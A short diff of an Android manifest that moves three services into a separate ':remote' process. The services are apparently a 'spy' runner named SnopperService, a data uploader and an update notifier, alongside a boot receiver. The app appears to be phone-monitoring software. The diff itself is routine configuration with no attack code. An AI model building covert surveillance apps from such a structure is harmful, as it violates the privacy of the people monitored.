@@ -35,11 +35,14 @@
 	android:label="@string/verifying_installation"
 	android:theme="@style/BaseTheme.DialogActivity"/>
     <!--Service for running spys-->
-    <service android:name=".services.SnopperService"/>
+    <service android:name=".services.SnopperService"
+	     android:process=":remote"/>
     <!--Service for uploading and downloading data from server-->
-    <service android:name=".services.UploaderService"/>
+    <service android:name=".services.UploaderService"
+	     android:process=":remote"/>
     <!--Service for showing update of app (when available) in permanent notification-->
-    <service android:name=".services.AppUpdateInformerService"/>
+    <service android:name=".services.AppUpdateInformerService"
+	     android:process=":remote"/>
     <!--Receiver for monitoring reboot of phone-->
     <receiver android:name=".receivers.OnBootCompleteReceiver">
       <intent-filter>
